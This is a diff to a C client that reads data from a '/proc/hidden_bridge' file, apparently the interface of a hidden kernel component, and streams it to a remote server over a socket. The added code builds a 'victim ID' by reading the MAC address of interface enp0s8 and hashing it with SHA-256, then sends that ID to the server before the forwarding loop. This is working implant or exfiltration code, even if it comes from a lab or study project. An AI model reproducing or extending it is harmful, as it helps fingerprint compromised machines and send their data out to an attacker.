@@ -4,9 +4,76 @@
 #include <fcntl.h>
 #include <string.h>
 #include <arpa/inet.h>
+#include <openssl/sha.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
 
 #define PROC_FILE "/proc/hidden_bridge"
 #define BUF_SIZE 1024
+#define EXTRAS_LEN 3 + 1 + 1
+
+// Get MAC address string from sysfs for a given interface.
+// Example output: "aa:bb:cc:dd:ee:ff\n"
+int get_mac_string(const char *ifname, char *mac_str, size_t mac_str_size)
+{
+    char path[256];
+    // Construct the sysfs path using the provided interface name
+    snprintf(path, sizeof(path), "/sys/class/net/%s/address", ifname);
+
+    FILE *f = fopen(path, "r");
+    if (!f)
+    {
+        perror("fopen mac sysfs");
+        return -1;
+    }
+
+    // Read up to mac_str_size - 1 characters from the file into the buffer
+    if (!fgets(mac_str, mac_str_size, f))
+    {
+        perror("fgets mac sysfs");
+        fclose(f);
+        return -1;
+    }
+
+    fclose(f);
+
+    // Calculate the length of the retrieved MAC address string
+    size_t len = strlen(mac_str);
+    if (len > 0 && mac_str[len - 1] == '\n')
+    {
+        mac_str[len - 1] = '\0'; // Replace the newline with a null terminator to clean the string
+    }
+
+    return 0;
+}
+
+// Hash a string with SHA-256 and return hex string.
+// Returns 0 on success, -1 on failure.
+int hash_string_sha256(const char *input, char *out_hex, size_t out_hex_size)
+{
+    // Allocate an array to store the raw 32-byte binary SHA-256 hash
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+
+    // Ensure the output buffer is large enough for 64 hex chars plus a null terminator
+    if (out_hex_size < (SHA256_DIGEST_LENGTH * 2 + 1))
+    {
+        return -1;
+    }
+
+    // input = the MAC, len of MAC, hash = raw binary output after hashing
+    SHA256((const unsigned char *)input, strlen(input), hash);
+
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
+    {
+        // Converting raw binary data (hash) into a readable hexadecimal string.
+        // Format each byte as a 2-character(0x0A, 0x1B, 0xFF) hex string and append it
+        snprintf(out_hex + i * 2, 3, "%02X", hash[i]); // out_hex = 0A1BFF\0
+    }
+
+    // Add a null terminator at the very end of the constructed hex string
+    out_hex[SHA256_DIGEST_LENGTH * 2] = '\0';
+    return 0;
+}
 
 int main(int argc, char *argv[])
 {
@@ -59,6 +126,23 @@ int main(int argc, char *argv[])
         return 1;
     }
 
+    // Build victim ID from MAC (sysfs) + SHA-256 and send it once
+    char mac_str[64];
+    char victim_id[SHA256_DIGEST_LENGTH * 2 + 1]; // 64 hex chars + '\0'
+
+    if (get_mac_string("enp0s8", mac_str, sizeof(mac_str)) == 0 && hash_string_sha256(mac_str, victim_id, sizeof(victim_id)) == 0)
+    {
+        // Allocate a buffer large enough for "ID:" prefix plus the hash and newline
+        char id_buf[EXTRAS_LEN + SHA256_DIGEST_LENGTH * 2]; // ID:(3), \n(1), \0(1) + 64 = 69 bytes
+        snprintf(id_buf, sizeof(id_buf), "ID:%s\n", victim_id);  // Format the final ID message string
+        send(sock, id_buf, strlen(id_buf), 0); // Send the formatted ID string
+    }
+    else
+    {
+        // Fallback ID if MAC or hash fails
+        send(sock, "ID:unknown\n", strlen("ID:unknown\n"), 0);
+    }
+    
     // Read from /proc and send to server
     while (1)
     {
